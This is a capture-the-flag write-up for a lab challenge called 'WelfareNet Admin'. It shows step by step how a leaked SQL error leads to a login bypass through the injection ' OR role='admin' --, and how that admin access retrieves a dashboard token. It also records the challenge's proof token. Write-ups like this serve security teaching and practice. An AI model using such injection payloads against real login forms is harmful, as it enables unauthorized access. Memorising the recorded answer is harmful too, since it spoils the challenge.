# WelfareNet Admin — SDG 1 Challenge Writeup

> **Challenge:** SQL injection on a login form to authenticate as admin and retrieve the disbursement integrity token from the admin dashboard.
>
> **Proof:** `7d2d80e4e446a38e260700af73216cce`

## Approach

### 1. Reconnaissance

The API exposes two endpoints:

- `POST ?action=login` — accepts `{"username": "...", "password": "..."}`
- `GET ?action=dashboard&api_token=<token>` — requires admin token

### 2. SQL Injection probe

The hint says the login form interpolates input directly into a query. Sending a single quote in the username field reveals the full SQL query in the error response:

```json
{
  "ok": false,
  "error": "SQL syntax error: trailing tokens: admin",
  "sql": "SELECT id,username,role,api_token FROM users
          WHERE username='admin'' AND password='admin' LIMIT 1"
}
```

This confirms:
- SQLite-style syntax (single quotes)
- 4 columns: `id`, `username`, `role`, `api_token`

### 3. Bypass authentication as admin

The query is:

```sql
SELECT id,username,role,api_token FROM users
WHERE username='<input>' AND password='<input>' LIMIT 1
```

Injecting a tautology in the username field that selects admin users:

```
username = ' OR role='admin' --
```

This makes the query:

```sql
SELECT id,username,role,api_token FROM users
WHERE username='' OR role='admin' --' AND password='x' LIMIT 1
```

**Response:**

```json
{
  "ok": true,
  "message": "Welcome, admin.",
  "session": {
    "user_id": 1,
    "username": "admin",
    "role": "admin",
    "api_token": "7d2d80e4e446a38e260700af73216cce"
  }
}
```

### 4. Access admin dashboard

Using the api_token:

```
GET ?action=dashboard&api_token=7d2d80e4e446a38e260700af73216cce
```

**Response:**

```json
{
  "ok": true,
  "disbursement_integrity_token": "7d2d80e4e446a38e260700af73216cce",
  "note": "Disbursement integrity token (32 hex). Submit to claim-runtime-flag as proof."
}
```

The 32-hex disbursement integrity token is the proof.

### 5. Claim

Submit `7d2d80e4e446a38e260700af73216cce` to the claim-runtime-flag endpoint with slug `welfarenet-admin`.

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| Probe | Syntax error leaks SQL query | Found 4-column query with single-quote interpolation |
| Bypass | `role='admin'` tautology injection | Logged in as admin, got api_token |
| Dashboard | Token-authenticated GET | Retrieved disbursement integrity token |
